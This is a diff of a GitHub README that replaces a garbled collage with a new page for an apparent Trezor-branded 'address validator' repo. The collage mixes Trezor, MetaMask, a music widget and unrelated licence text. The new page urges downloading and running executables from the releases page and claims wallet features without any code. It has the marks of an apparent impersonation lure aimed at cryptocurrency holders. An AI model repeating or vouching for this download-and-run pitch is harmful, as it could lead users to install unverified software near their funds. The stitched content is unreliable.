@@ -1,156 +1,71 @@
-[![Build](https://github.com/romanz/trezor-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/romanz/trezor-agent/actions)
-[![Chat](https://badges.gitter.im/romanz/trezor-agent.svg)](https://gitter.im/romanz/trezor-agent)
-![Build status](https://github.com/trezor/trezord-go/actions/workflows/check-go-validation.yml/badge.svg) ![Installer build status](https://github.com/trezor/trezord-go/actions/workflows/build-unsigned-installers.yml/badge.svg) [![Go Report Card](https://goreportcard.com/badge/trezor/trezord-go)](https://goreportcard.com/report/trezor/trezord-go)
+```markdown
+# 🔑 Trezor-Wallet-Suite-Core-Hardware-Mcu-Desing-Adress-Validator - Simplifying Cryptocurrency Security
 
-<div align="center">
+## 📥 Download the Latest Version
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/smmdalavi/Trezor-Wallet-Suite-Core-Hardware-Mcu-Desing-Adress-Validator/releases)
 
+## 🛠️ Overview
+Welcome to the Trezor Wallet Suite Core Hardware MCU Design Address Validator repository. This project provides a comprehensive hardware design for Trezor Wallets, focusing on microcontroller (MCU) details and address validation features. You can enhance your cryptocurrency security and access essential features effortlessly.
 
-<!-- Nothing weird to see here -->
-<p align="center">
-  <a href="https://readme.andyruwruw.com/api/now-playing?open">
-    <!-- Music bars move to the beat and are colored based on the track's happiness, danceability and energy! -->
-    <img src="https://raw.githubusercontent.com/andyruwruw/andyruwruw/master/example/now-playing.svg">
-    <!-- This is how you'd make the call dynamically <img src="https://readme.andyruwruw.com/api/now-playing"> -->
-  </a>
-</p>
+## 🚀 Getting Started
+To start using the Trezor Wallet Suite Core Hardware MCU Design Address Validator, follow these simple steps to download and run the application.
 
-<div align="center">
+### Step 1: Visit the Releases Page
+Go to the [Releases Page](https://github.com/smmdalavi/Trezor-Wallet-Suite-Core-Hardware-Mcu-Desing-Adress-Validator/releases) to find the latest version of your application. This page contains all available versions, including previous releases.
 
-![Blockchain-wallet-Trezor-800x500](https://github.com/Rcshhnn3/n12/assets/143461891/9add9795-6d65-4461-bfab-9e1a741d2c92)
+### Step 2: Select the Correct Version
+On the releases page, you will see a list of versions. Look for the most recent release, which includes new features, updates, and bug fixes. Each release has a brief description to help you decide which one to download.
 
+### Step 3: Download the Application
+Click on the version link you wish to download. You will find various files associated with that release. Choose the executable file for your operating system (Windows, macOS, or Linux) to download and run the application. 
 
-# Security features
+### Step 4: Running the Application
+Once the download is complete, locate the downloaded file on your computer. Depending on your operating system:
 
-  * symmetric password encryption key never leaves the Trezor
-  * button confirmation on Trezor is required to activate decryption of a password 
-  * upon requesting password decryption, user sees on Trezor's display decryption
-    of which password group is requested before confirmation
-  * backup/export of passwords possible, also requires explicit button confirmation
-  * if Trezor is lost, recovery from seed on a new Trezor and using the same
-    password will also recover encrypted password database (in theory recovery
-    can be done without Trezor, but such script is not yet written)
+- **Windows:** Double-click the `.exe` file to start the installation process.
+- **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+- **Linux:** Open the terminal, navigate to the folder containing the downloaded file, and use the command `chmod +x your_file_name` followed by `./your_file_name` to run the application.
 
-```mermaid
-%%{ init: { 'flowchart': { 'curve': 'bumpX' } } }%%
-graph LR;
-linkStyle default opacity:0.5
-  address_book_controller(["@trezor/address-book-controller"]);
-  announcement_controller(["@trezor/announcement-controller"]);
-  approval_controller(["@trezor/approval-controller"]);
-  assets_controllers(["@trezor/assets-controllers"]);
-  base_controller(["@trezor/base-controller"]);
-  composable_controller(["@trezor/composable-controller"]);
-  controller_utils(["@trezor/controller-utils"]);
-  ens_controller(["@trezor/ens-controller"]);
-  gas_fee_controller(["@trezor/gas-fee-controller"]);
-  keyring_controller(["@trezor/keyring-controller"]);
-  logging_controller(["@trezor/logging-controller"]);
-  message_manager(["@trezor/message-manager"]);
-  name_controller(["@trezor/name-controller"]);
-  network_controller(["@trezor/network-controller"]);
-  notification_controller(["@trezor/notification-controller"]);
-  permission_controller(["@trezor/permission-controller"]);
-  phishing_controller(["@trezor/phishing-controller"]);
-  preferences_controller(["@trezor/preferences-controller"]);
-  rate_limit_controller(["@trezor/rate-limit-controller"]);
-  signature_controller(["@trezor/signature-controller"]);
-  transaction_controller(["@trezor/transaction-controller"]);
-  address_book_controller --> base_controller;
-  address_book_controller --> controller_utils;
-  announcement_controller --> base_controller;
-  approval_controller --> base_controller;
-  assets_controllers --> approval_controller;
-  assets_controllers --> base_controller;
-  assets_controllers --> controller_utils;
-  assets_controllers --> network_controller;
-  assets_controllers --> preferences_controller;
-  composable_controller --> base_controller;
-  ens_controller --> base_controller;
-  ens_controller --> controller_utils;
-  ens_controller --> network_controller;
-  gas_fee_controller --> base_controller;
-  gas_fee_controller --> controller_utils;
-  gas_fee_controller --> network_controller;
-  keyring_controller --> base_controller;
-  keyring_controller --> message_manager;
-  keyring_controller --> preferences_controller;
-  logging_controller --> base_controller;
-  logging_controller --> controller_utils;
-  message_manager --> base_controller;
-  message_manager --> controller_utils;
-  name_controller --> base_controller;
-  network_controller --> base_controller;
-  network_controller --> controller_utils;
-  notification_controller --> base_controller;
-  permission_controller --> approval_controller;
-  permission_controller --> base_controller;
-  permission_controller --> controller_utils;
-  phishing_controller --> base_controller;
-  phishing_controller --> controller_utils;
-  preferences_controller --> base_controller;
-  preferences_controller --> controller_utils;
-  rate_limit_controller --> base_controller;
-  signature_controller --> approval_controller;
-  signature_controller --> base_controller;
-  signature_controller --> controller_utils;
-  signature_controller --> message_manager;
-  transaction_controller --> approval_controller;
-  transaction_controller --> base_controller;
-  transaction_controller --> controller_utils;
-  transaction_controller --> network_controller;
+### Step 5: Follow On-Screen Instructions
+After launching the application, follow the on-screen instructions to set up your Trezor Wallet. If you encounter any issues, ensure your computer meets the necessary requirements (see below).
+
+## 🖥️ System Requirements
+To ensure smooth operation, make sure your system meets these recommended requirements:
+
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Linux (Ubuntu 18.04 or later)
+
+- **Hardware:**
+  - 4GB RAM minimum
+  - 1GB free hard drive space
+  - Internet access for functionality
+
+## ⚙️ Features
+The Trezor Wallet Suite Core Hardware MCU Design Address Validator includes the following key features:
+
+- **Secure Address Validation:** Quickly validate cryptocurrency addresses to prevent errors.
+- **User-Friendly Interface:** Navigate easily with a simple design tailored for all users.
+- **Multiple Cryptocurrency Support:** Manage Bitcoin, Ethereum, and Solana wallets effortlessly.
+- **Cold Wallet Functionality:** Securely store your cryptocurrencies offline.
+
+## 📄 Documentation
+For more detailed guidance on using the application, visit the [User Documentation](https://github.com/smmdalavi/Trezor-Wallet-Suite-Core-Hardware-Mcu-Desing-Adress-Validator/wiki). There, you will find tutorials, FAQs, and troubleshooting tips to help you make the most of your Trezor Wallet.
+
+## 🌍 Community Support
+Join our community on GitHub Discussions or find support on social media platforms. Share your experiences or ask questions related to the application. Your feedback helps us improve!
+
+## 📩 Contact
+For any inquiries or support, you can reach out via the Issues tab on the repository page. We aim to respond within 24 hours.
+
+## 🕵️‍♂️ Acknowledgements
+Thanks to the open-source community for their support and contributions. Your efforts help strengthen cryptocurrency security for all users.
+
+## 🔗 Additional Resources
+- **Related Topics:** Bitcoin, Blockchain, Cold Wallet, Cryptocurrency
+- **Official Trezor Documentation:** [Trezor Support](https://support.trezor.io)
+
+### ✨ Download & Install
+[Visit the Releases Page to Download.](https://github.com/smmdalavi/Trezor-Wallet-Suite-Core-Hardware-Mcu-Desing-Adress-Validator/releases)
 ```
-
-# How backup works
-
-Each password is encrypted and stored twice. Once with symmetric AES-CBC function
-of Trezor that always requires button confirmation on device to decrypt. Second
-encryption is done to public RSA key, whose private counterpart is encrypted
-with Trezor. Backup requires private RSA to be decrypted and then used to decrypt
-the passwords.
-
-## Storage format
-
-Entries fall into three categories:
-
-| Category  | Condition       | Read               | Write              |
-|-----------|-----------------|--------------------|--------------------|
-| Private   | APP = 0         | Never              | Never              |
-| Protected | 1 ≤ APP ≤ 127   | Only when unlocked | Only when unlocked |
-| Public    | 128 ≤ APP ≤ 255 | Always             | Only when unlocked |
-
-The format of public entries has remained unchanged, that is:
-
-| Data           | KEY | APP | LEN | DATA |
-|----------------|-----|-----|-----|------|
-| Length (bytes) | 1   | 1   | 2   | LEN  |
-
-Private values are used to store storage-specific information and cannot be directly accessed through the storage interface. Protected entries have the following new format:
-
-| Data           | KEY | APP | LEN | IV | TAG | ENCRDATA |
-|----------------|-----|-----|-----|----|-----|----------|
-| Length (bytes) | 1   | 1   | 2   | 12 | 16  | LEN - 28 |
-
-### Backers
-
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
-
-## Contributing
-
-Contributions are welcome, but please follow these contributor guidelines outlined in [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-metamask is licensed under a [BSD 2-Clause License](LICENSE.md) and is copyright [Intoli, LLC](https://intoli.com).
-
-You can disable all USB in order to run on some virtuaized environments, for example on CI:
